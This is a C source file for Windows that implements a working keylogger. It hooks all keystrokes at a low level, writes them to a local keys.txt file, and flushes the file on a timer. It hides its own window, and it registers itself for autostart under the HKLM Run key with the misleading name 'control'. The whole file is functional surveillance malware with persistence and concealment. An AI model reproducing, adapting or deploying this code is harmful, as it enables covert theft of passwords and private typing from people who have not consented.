#define _CRT_SECURE_NO_DEPRECATE
#include <windows.h>
#include <stdio.h>
#include "resource.h"
#include <direct.h>

FILE *out;

#define TICK_TIMER 1


LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);

	// If key is being pressed
	if (wParam == WM_KEYDOWN)
	{
		switch (p->vkCode)
		{
			// Invisible keys
		case VK_CAPITAL:	
			fprintf(out, "<CAPLOCK>");
			break;
		case VK_SHIFT:
			fprintf(out, "<SHIFT>");
			break;
		case VK_LCONTROL:
			fprintf(out, "<LCTRL>");
			break;
		case VK_RCONTROL:
			fprintf(out, "<RCTRL>");
			break;
		case VK_INSERT:
			fprintf(out, "<INSERT>");
			break;
		case VK_END:
			fprintf(out, "<END>");
			break;
		case VK_PRINT:
			fprintf(out, "<PRINT>");
			break;
		case VK_DELETE:
			fprintf(out, "<DEL>");
			break;
		case VK_BACK:
			fprintf(out, "<BK>");
			break;
		case VK_LEFT:
			fprintf(out, "<LEFT>");
			break;
		case VK_RIGHT:
			fprintf(out, "<RIGHT>");
			break;
		case VK_UP:
			fprintf(out, "<UP>");
			break;
		case VK_DOWN:
			fprintf(out, "<DOWN>");
			break;

			// Visible keys
		default:
			fputc((char)tolower(p->vkCode), out);

		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

BOOL CALLBACK DialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{

	switch (message)
	{
	case WM_INITDIALOG:
		SetTimer(hDlg, TICK_TIMER, 5000, NULL);
		return 0;
	case WM_TIMER:
		switch (wParam)
		{
		case TICK_TIMER:
			fflush(out);
			break;
		}
		return 0;
	case WM_CLOSE:
		EndDialog(hDlg, 0);
		DestroyWindow(hDlg);
		return 0;
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	}
	return DefWindowProc(hDlg, message, wParam, lParam);
}

bool configureAutoRun(char *path)
{
	HKEY hKey;
	DWORD dwDisposition;

	/* get register path */
	LPCTSTR autoRun = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

	/* open auto-run-items key */
	LSTATUS createStatu = RegCreateKeyEx(HKEY_LOCAL_MACHINE,
		autoRun,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS | KEY_WOW64_64KEY,
		NULL,
		&hKey,
		&dwDisposition
	);

	if (createStatu == ERROR_SUCCESS)
	{
		/* add sub key */
		createStatu = RegSetValueEx(hKey, "control", 0, REG_SZ, (const unsigned char *)path, strlen(path));
		/* close register */
		RegCloseKey(hKey);
		if (createStatu == ERROR_SUCCESS)
		{
			return true;
		}
	}
	return false;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
{
	HWND hDlg;
	MSG msg;

	char path[256];
	_getcwd(path, 256);
	strcat(path, "\\keylog.exe");

	configureAutoRun(path);

	out = fopen("keys.txt", "a+");
	if (out == NULL)
		return 0;

	HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, hInstance, 0);

	hDlg = CreateDialogParam(hInstance, MAKEINTRESOURCE(IDD_DIALOG1), 0, DialogProc, 0);
	ShowWindow(hDlg, 0);




	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}